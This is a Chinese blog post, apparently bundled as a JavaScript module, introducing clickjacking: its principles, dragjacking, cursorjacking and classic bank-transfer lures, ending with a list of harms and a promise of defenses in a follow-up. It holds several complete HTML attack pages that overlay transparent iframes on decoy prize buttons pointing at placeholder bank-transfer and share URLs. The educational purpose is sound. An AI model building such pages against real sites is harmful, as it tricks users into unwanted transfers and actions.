const n=`---
title: "点击劫持攻击与防护（一）- 攻击原理与类型"
excerpt: "深入探讨点击劫持攻击的基本原理、攻击流程、高级技术以及不同类型的点击劫持攻击，帮助开发者理解这种视觉欺骗攻击的机制"
coverImage: "/assets/blog/preview/cover.jpg"
date: "2025-11-08"
author:
  name: 小羽
  picture: "/assets/blog/authors/jj.jpeg"
ogImage:
  url: "/assets/blog/dynamic-routing/cover.jpg"
---

# 点击劫持攻击与防护（一）：攻击原理与类型

## 前言

点击劫持(Clickjacking)是一种视觉欺骗攻击，攻击者通过将目标网站嵌入透明iframe，并覆盖其他内容，诱骗用户点击非预期的位置。这种攻击可以导致用户在不知情的情况下执行敏感操作，如转账、修改密码、下载恶意软件等。本文将深入探讨点击劫持攻击的原理、类型以及攻击技术，帮助你理解这种隐蔽但危害性极大的Web安全威胁。

## 点击劫持攻击原理

### 基本攻击流程

点击劫持攻击的核心思想是利用透明iframe和视觉欺骗，让用户在不知情的情况下点击隐藏的元素。以下是基本的攻击流程：

\`\`\`html
<!-- 1. 攻击者创建恶意页面 -->
<!DOCTYPE html>
<html>
<head>
  <title>有趣的小游戏</title>
  <style>
    /* 隐藏目标网站 */
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0; /* 完全透明 */
      z-index: 2;
      border: none;
    }
    
    /* 诱饵内容 */
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
    
    /* 诱饵按钮 */
    .decoy-button {
      position: absolute;
      top: 200px;
      left: 300px;
      width: 120px;
      height: 40px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- 诱饵内容 -->
  <div class="decoy-content">
    <h1>点击下方按钮赢取大奖！</h1>
    <button class="decoy-button">点击赢奖</button>
  </div>
  
  <!-- 隐藏的目标网站 -->
  <iframe 
    class="hidden-iframe"
    src="https://bank.example.com/transfer?to=attacker&amount=1000">
  </iframe>
</body>
</html>

<!-- 2. 用户看到的是诱饵内容 -->
<!-- 但实际点击的是透明iframe中的转账按钮 -->
\`\`\`

攻击流程的关键步骤：
1. 攻击者创建一个包含透明iframe的恶意页面
2. iframe加载目标网站（如银行网站）
3. 攻击者在iframe上方放置诱饵内容（如抽奖按钮）
4. 用户点击诱饵按钮时，实际上点击了iframe中的敏感操作按钮
5. 敏感操作在用户不知情的情况下执行

### 高级点击劫持技术

除了基本的透明iframe技术，攻击者还开发了多种高级点击劫持技术：

#### 1. 拖拽劫持(Dragjacking)

拖拽劫持利用用户的拖拽操作，在用户拖拽元素时触发隐藏iframe中的操作：

\`\`\`html
<!-- 拖拽劫持示例 -->
<!DOCTYPE html>
<html>
<head>
  <title>拖拽游戏</title>
  <style>
    .game-area {
      width: 500px;
      height: 500px;
      border: 2px solid #333;
      position: relative;
      overflow: hidden;
    }
    
    .draggable {
      width: 100px;
      height: 100px;
      background-color: #3498db;
      position: absolute;
      cursor: move;
      z-index: 2;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 1;
      border: none;
      pointer-events: none; /* 禁用iframe交互 */
    }
    
    .drop-zone {
      width: 150px;
      height: 150px;
      background-color: #2ecc71;
      position: absolute;
      bottom: 20px;
      right: 20px;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>将蓝色方块拖到绿色区域</h1>
  
  <div class="game-area">
    <div class="draggable" id="draggable"></div>
    <div class="drop-zone"></div>
    
    <!-- 隐藏的目标网站 -->
    <iframe 
      class="hidden-iframe"
      id="target-iframe"
      src="https://social-media.example.com/share?message=I+love+this+product!">
    </iframe>
  </div>
  
  <script>
    const draggable = document.getElementById('draggable');
    const targetIframe = document.getElementById('target-iframe');
    let isDragging = false;
    let startX, startY;
    
    draggable.addEventListener('mousedown', (e) => {
      isDragging = true;
      startX = e.clientX;
      startY = e.clientY;
      
      // 开始拖拽时启用iframe交互
      targetIframe.style.pointerEvents = 'auto';
    });
    
    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      
      const deltaX = e.clientX - startX;
      const deltaY = e.clientY - startY;
      
      draggable.style.transform = \`translate(\${deltaX}px, \${deltaY}px)\`;
    });
    
    document.addEventListener('mouseup', () => {
      isDragging = false;
      
      // 停止拖拽时禁用iframe交互
      targetIframe.style.pointerEvents = 'none';
    });
  <\/script>
</body>
</html>
\`\`\`

#### 2. 光标劫持(Cursorjacking)

光标劫持通过伪造光标位置，误导用户点击非预期位置：

\`\`\`html
<!-- 光标劫持示例 -->
<!DOCTYPE html>
<html>
<head>
  <title>光标劫持示例</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      cursor: none; /* 隐藏真实光标 */
    }
    
    .fake-cursor {
      position: absolute;
      width: 20px;
      height: 20px;
      background-image: url('cursor.png');
      pointer-events: none; /* 不影响鼠标事件 */
      z-index: 1000;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
    
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
  </style>
</head>
<body>
  <!-- 诱饵内容 -->
  <div class="decoy-content">
    <h1>点击下方按钮获取奖励</h1>
    <button style="position: absolute; top: 200px; left: 300px;">获取奖励</button>
  </div>
  
  <!-- 隐藏的目标网站 -->
  <iframe 
    class="hidden-iframe"
    src="https://example.com/subscribe">
  </iframe>
  
  <!-- 假光标 -->
  <div class="fake-cursor" id="fake-cursor"></div>
  
  <script>
    const fakeCursor = document.getElementById('fake-cursor');
    
    // 跟踪真实鼠标位置
    document.addEventListener('mousemove', (e) => {
      // 偏移假光标位置
      const offsetX = 100; // 水平偏移
      const offsetY = 50;  // 垂直偏移
      
      fakeCursor.style.left = (e.clientX + offsetX) + 'px';
      fakeCursor.style.top = (e.clientY + offsetY) + 'px';
    });
  <\/script>
</body>
</html>
\`\`\`

## 点击劫持攻击类型

### 经典点击劫持

经典点击劫持是最常见的类型，通常针对金融交易、社交媒体分享等敏感操作：

\`\`\`html
<!-- 银行转账点击劫持 -->
<!DOCTYPE html>
<html>
<head>
  <title>免费抽奖活动</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    
    .container {
      width: 100%;
      height: 100vh;
      position: relative;
      overflow: hidden;
    }
    
    .lottery-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      padding-top: 50px;
    }
    
    .lottery-title {
      font-size: 2.5em;
      margin-bottom: 20px;
    }
    
    .lottery-description {
      font-size: 1.2em;
      margin-bottom: 30px;
    }
    
    .lottery-button {
      position: absolute;
      top: 300px;
      left: 50%;
      transform: translateX(-50%);
      width: 200px;
      height: 60px;
      background-color: #ff6b6b;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 1.5em;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- 诱饵内容 -->
    <div class="lottery-content">
      <h1 class="lottery-title">🎉 幸运大抽奖 🎉</h1>
      <p class="lottery-description">
        点击下方按钮，有机会赢取iPhone 14 Pro！<br>
        100%中奖，绝不落空！
      </p>
      
      <button class="lottery-button">立即抽奖</button>
    </div>
    
    <!-- 隐藏的银行转账页面 -->
    <iframe 
      class="hidden-iframe"
      src="https://bank.example.com/transfer?to=attacker-account&amount=5000">
    </iframe>
  </div>
</body>
</html>
\`\`\`

### 点击劫持攻击的危害

点击劫持攻击可能导致以下严重后果：

1. **金融损失**：用户在不知情的情况下进行转账或支付
2. **隐私泄露**：用户在不知情的情况下分享个人信息
3. **账户劫持**：攻击者通过点击劫持获取用户账户控制权
4. **恶意软件下载**：诱骗用户下载并安装恶意软件
5. **社交媒体滥用**：在用户不知情的情况下发布内容或发送消息

## 总结

点击劫持是一种隐蔽但危害性极大的Web安全威胁，通过视觉欺骗诱骗用户执行非预期操作。了解点击劫持的攻击原理和类型是构建有效防护策略的第一步。

在下一篇文章中，我们将深入探讨点击劫持的防护策略，包括服务器端和客户端的防护技术，以及如何检测和监控点击劫持攻击，帮助你构建更加安全的Web应用。`;export{n as default};
//# sourceMappingURL=24-1-DJkrkEcf.js.map
